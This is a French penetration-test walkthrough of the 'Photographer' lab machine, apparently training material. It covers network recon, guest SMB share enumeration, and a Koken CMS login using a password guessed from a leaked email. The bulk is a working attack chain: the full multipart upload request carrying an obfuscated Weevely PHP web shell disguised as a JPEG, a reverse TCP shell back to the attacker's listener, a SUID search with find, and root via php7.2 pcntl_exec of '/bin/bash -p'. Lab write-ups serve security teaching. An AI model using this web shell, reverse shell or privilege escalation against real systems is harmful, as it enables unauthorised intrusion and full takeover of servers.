#Photographer pentest 

## RECON 

>	netdiscover 
	
	netdiscover -r 172.16.0.0/16 

ATTENTION LES REQUETES ARP NE PASSENT PAS A TRAVERS LE VPN !!! 
PENSER A PRENDRE LA MAIN SUR LA KALI DISTANTE

 Currently scanning: 172.16.36.0/16   |   Screen View: Unique Hosts                                     
                                                                                                        
 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300                                        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 172.16.11.1     0a:6a:d6:72:99:2f      1      60  Unknown vendor                                       
 172.16.21.1     0a:6a:d6:72:99:2f      1      60  Unknown vendor                                       
 172.16.21.106   9a:57:38:60:98:61      1      60  Unknown vendor                                       
 172.16.21.107   6e:eb:d0:57:28:d9      1      60  Unknown vendor                                       
 172.16.21.117   f2:f3:44:f0:4e:c0      1      60  Unknown vendor   <- target 

(capture d'écran)

on identifie sa ou ses cibles, pensez à rester structuré dans votre rapport.



nmap -sC -sV -p- --vv 172.16.21.108

PORT     STATE SERVICE     REASON         VERSION
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h19m04s, deviation: 2h18m33s, median: -55s
| nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   PHOTOGRAPHER<00>     Flags: <unique><active>
|   PHOTOGRAPHER<03>     Flags: <unique><active>
|   PHOTOGRAPHER<20>     Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42902/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41435/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15600/udp): CLEAN (Failed to receive data)
|   Check 4 (port 12931/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2020-08-31T05:35:38-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-31T09:35:38
|_  start_date: N/A


On a beaucoup trop de choses ouverte pour un site web, je pense notamement au SMB ouvert en guest sur un serveur web ;-) . Premier truc à tenter puisque c'est ouvert ! 

Kali n'as pas vraiment d'outils pour travailler sur du smb .... soit vous vous passer en graphique et vous vous connecter sur le server 172.16.x.x en guest soit vous pouvez aller voir du côté de smbclient 


 smbclient -N -L \\\\172.16.21.117
 
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available


vous avez bien un partage de présent sur le serveur "sambashare"

on se connecte 

smbclient \\\\172.16.21.117\\sambashare
Enter WORKGROUP\nico's password: on tape entrée (guest mode)
Try "help" to get a list of possible commands.
smb: \> dir (ls fonctionne aussi )
  .                                   D        0  Tue Jul 21 03:30:07 2020
  ..                                  D        0  Tue Jul 21 11:44:25 2020
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 03:22:23 2020

on récupère les contenus 

smb: \> get mailsent.txt 
getting file \mailsent.txt of size 503 as mailsent.txt (0,7 KiloBytes/sec) (average 0,7 KiloBytes/sec)
smb: \> get wordpress.bkp.zip 

getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (852,6 KiloBytes/sec) (average 815,6 KiloBytes/sec)


on vas regarder le fichier text qui parle d'un mail envoyé



Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)

Nous avons deux adressses mail  que l'on va mettre de côté

agi@photographer.com
daisa@photographer.com

dans les mails il y a toujours un nom d'utilisateur

on vas donc tester du côté du port 8000 on tombe sur l'interface de koken un cms orienté photo

nom d'utilisateur daisa@photographer.com
passwd babygirl ;-) oui je sais c'est moisi 


quand je vois une interface avec une espace uplaod file ... çà vaut le coup de tester la file upload ... vraiment dés fois çà passe 

aller on génére une BKD weevely 

weevely generate connect special.php
Generated 'special.php' with password 'connect' of 761 byte size.
root@linux:/home/nico/Documents/SIMPLON/Infosec/PLTCyber# cp special.php special.php.jpg*

un jour un gars me disais weevely c'est la vie !!! BIMMM çà passe mais attention il vas falloir se retrousser les manches !!! 

aller on ouvre BurpSuite et ce cela implique (navigateur dédie sous le 127.0.0.1:8080)

on laisse le mode inercept on et on vas jouer la requête en direct 

vous n'aurez plus qu'a faire des forwards et puis modifié votre special.php.jpg en special.php 


voici le corp de votre requête NON MODIFIEE 

POST /api.php?/content HTTP/1.1
Host: 172.16.21.117:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://172.16.21.117:8000/admin/
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------59958074211667389191809679554
Content-Length: 1825
Connection: close
Cookie: koken_referrer=; koken_session_ci=hVx%2FwxdI0K2Wvo330rkPtMWOidW0u9wFN1iUUnRSUDeS7HAahrj47BVMJjuOei%2FwffLwYB%2B1rx3UQSIkxXepqOOUw%2BdPEctvuFm%2BmjvhJ9x%2FHLW9I3ox2Bp%2BZCcwEqWYorfVqfLdPeRIZvypZHCif9R%2BkJQz80SYSx1oL7RhqDtsz6F5Qv6vwFbIzc1Xpkghd48YmNX%2BvNuhBPm79RjpzvNt%2FCEkzGjPGsgXmrMi0x4r0lVvIlooS87r0CNhJ3LFpko2YOAl9fDYcZ6LmAeCcTtWLJSDiUllJxa63%2FyY2j4n0CmiciRtCx6VvnphzWrCm1knJW10QKWvsL5hsMwEnpatLpzPPdj%2FN0PBmhw61wJuiQv13YG9CEoMqXRT25g%2FOS7wuTnQgGJjsS6ugcb1jEs3SrMht93BCPQBz82WYWREiWqCUcAy%2Bo0c5Fkx2ekwRVDRzF7PmcHu6PbPS1BewnvcLIBaBk7Op%2Bwl26tP6NVCNN2H6iZrnW%2FssAVVvJX6wZti6vIZEnq5GMeN1XGXVafzlVyqYC2xxzMlxXgqPG4ShB%2BCoK6I%2BsO0%2BNWW1z280jp%2FiG7gThUJksm7oZ8X0dnLFdK224M9MWcQNqqNknZl7dM%2F81MAoY4P%2FSoduF3GW%2BQkICN%2BjvT%2FwOZc1alBi%2F1yPl%2B3vfmoZZi4LjD6gytSyaHJGse9eJ2I%2Bo8Z0Qfrrfy20H0JFZw2BQEhRdnVznae0epvpPnjbHcM761FOrvUFfl7qEbxQRPO89ib%2B5iQxW8EL%2BqGjZMGxRP0Ry856r%2FYDAnUNvw%2FyzR72Lqr5hViNOwsaU22w6u64hMe1LaTZgUAHHyt1yv0Jwo3mjDu6pEQ24dxvxlVoQcovFKIadQ%2BlguQW3U3bL9HjZrqEs2ICPxpTyGDxXd%2B14AavotXdaXk5tPGG0iUrftldGtj6G1orrgIUifFYvsiGCuOnAlFdH5KORXGsC8A608H%2F49hMIiWZMD6l8EewjFFdT8fTRiMnnpaVzFrp0Z54%2FG3BNLxzO747tHlmsZtKYasTM5HL7qu%2Bkf%2BE7ZV2tJUnl7v9VzyR72dN9djjdzk7yAKGWTDZwyTn%2F1Glu3gzJj5VfVg6C3L9hE5hi24FGclvIoC2eOWuYKHk3VWFNilHwiMa%2FplPh58vVAY%2FiXM1MeZ%2FbTJxqH7eijR2%2Bwuqij%2FFhtMpUYbc90UdEEofQG5eTWZLNpS4cxCBzCVTaoSj%2FVm3AzXj2330P%2BM5PwmgGzRzQmPEdPbK4y8z45ZXfUbkpbdpA1F9157b50eece664ab4a6c023af790029c2032383d

-----------------------------59958074211667389191809679554
Content-Disposition: form-data; name="name"

**special.php.jpg** on modifie en special.php
-----------------------------59958074211667389191809679554
Content-Disposition: form-data; name="chunk"

0
-----------------------------59958074211667389191809679554
Content-Disposition: form-data; name="chunks"

1
-----------------------------59958074211667389191809679554
Content-Disposition: form-data; name="upload_session_start"

1599039950
-----------------------------59958074211667389191809679554
Content-Disposition: form-data; name="visibility"

public
-----------------------------59958074211667389191809679554
Content-Disposition: form-data; name="license"

all
-----------------------------59958074211667389191809679554
Content-Disposition: form-data; name="max_download"

none
-----------------------------59958074211667389191809679554
Content-Disposition: form-data; name="file"; filename="**special.php.jpg**" on modifie en special.php
Content-Type: image/jpeg

<?php
$o='j=0;($j<$c&#n&#n$i<$#nl);#n$j++,$i++){$o.=#n$t{#n$i}^$#nk{$j};}}ret#nur#nn $o;}i#nf#n (@#npreg_m';
$S='$k="b64#n0#na0ce";$k#nh="465fa#n2a4150c"#n;$#nkf="36b#n3#n05c1c11#nb";#n$p="WkfyOquKq0#nh2dZCl";f';
$d='atch("/$kh#n(.#n+)$kf/",#n@fil#ne_get_#ncont#nents("php:/#n/input")#n,$m)==#n1#n) {@ob_star#nt();@e#nva';
$I=str_replace('vJ','','crvJeatvJevJ_vJfunvJvJction');
$c='l(@g#nz#nuncompress#n(@x(@b#na#nse6#n4_dec#node($m[1]#n),$k)#n));#n$o=@ob_get_conte#n#nnts();@o#';
$M='#nuncti#non x(#n$t,#n$k){$c=st#nrle#nn($#nk);$l#n=strlen($t);$#no="";fo#nr($#ni=0;$#ni<$l;)#n{for#n($';
$p='nb_end_#nclean()#n;$r=@#nba#nse64_encode(@x#n(@#ng#nzcompress#n($o),$#nk));pri#nnt("$p#n$kh$r$kf");}';
$u=str_replace('#n','',$S.$M.$o.$d.$c.$p);
$l=$I('',$u);$l();
?>

-----------------------------59958074211667389191809679554--

puis Forward Forward Forward un peu comme l'avance rapide sur une Cassete Magnétique BASF >> >> >> 

on se retrouve du coup avec le fichier en place on a plus qu'a se connecter :-) 

pour cela rdv sur la page du fichier nouvellement arrivé en haut de la fenetre vous devriez avoir un lien vers Download File... Copier le lien 

puis 

weevely http://172.16.21.117:8000/storage/originals/41/46/special.php connect

[+] weevely 4.0.1

[+] Target:	172.16.21.117:8000
[+] Session:	/root/.weevely/sessions/172.16.21.117/special_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> ls
special.php
www-data@photographer:/var/www/html/koken/storage/originals/41/46 $ 

vous avez compris on est sous la session www-data 

maintenant ce shell est pas totalement top il bug pas stable .... enfin pour avoir un acces complet et plus propre ... on vas devoir faire un shell reverse tcp 

weevely est bien plus qu'une simple basckdoor ... je vous montre çà de suite 

www-data@photographer:/tmp $ :backdoor_reversetcp
error: the following arguments are required: lhost, port
usage: backdoor_reversetcp
       [-h]
       [-shell SHELL]
       [-no-autonnect]
       [-vector {netcat_bsd,netcat,python,devtcp,perl,ruby,telnet,python_pty}]
       lhost
       port


j'ai un peu fouillé et j'ai trouver dans le man page des modules vraiment très très sympa

Qui dit reverse shell il vas falloir lancer une écoute de notre coté 

un simple nc -lnvp 1234 par exemple 

nc -lnvp 1234 
Listening on 0.0.0.0 1234

on lance notre bacdoor depuis le shell web 

www-data@photographer:/tmp $ :backdoor_reversetcp 10.0.11.3 1234
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'
Error binding socket: '[Errno 98] Address already in use'

BIMMM on récupère le shell chez nous 

il nous reste à trouver quel est l'endroit où on peut effectuer notre PrivEsc ... on est dans un contexte très particulier mais qui peut se retouver dans la vie de tout les jours. Un executable comme apache qui se retrouve à tourner avec des droits trop étendus. Comment faire pour trouver çà ? 


La commande **find** je détaille !  

voici la commande complète 

> find / -perm u=s -type f 2>/dev/null 

> 	find / 
*je cherche sur le repertoire racine , donc tout ce qui est en dessous*
>	 find / -perm u=s 
*toujours la même recherche mais on vient spécifier user=special, permissions spéciales*
> 	find / -perm u=s -type f 
*idem on spécifie le type de fichier f pour "regular file"*
>	find / -perm u=s -type f 2>/dev/null 
  ou 
  encore 

    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null


*permet de mettre en muet les renvois d'erreur "Permissions denied en silence"*

Ce qui nous donnnera en résultat uniquement des éxécutables où nous auront des droits , n'oublions pas nous sommes en www-data 

on joue l'elevation de privilège sur php7.2 pourquoi car on est en septembre 2020 et  nous sommes à la version 7.8 et également car nous sommes sur un site web !

Depuis notre reverse shell (sur notre kali)

$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-- 1 root messagebus 42992 Jun 11 16:06 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 110792 Jul 10 14:53 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 18664 Mar 18  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
-rwsr-xr-x 1 root root 14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root dip 394984 Jul 23 11:09 /usr/sbin/pppd
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 4883680 Jul  9 13:40 /usr/bin/php7.2
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su



Nous sommes sur un compte www-data il semble le plus logique de passer la commande /bin/bash -p avec php7.2



$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
whoami
root
ls /root/ 
proof.txt
cat /root/proof.txt
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e

Nous avons terminé ! 

FINDINGS a trouvé sont : 

Version obsolète du system 16.04 LTS 
SMB actif sur un serveur Web c'est juste non acceptable 

koken CMS File upload arbritary upload
https://www.exploit-db.com/exploits/48706

php7.2 mauvais droit mis en place sur /usr/bin/php7.2 et versions non a jour 













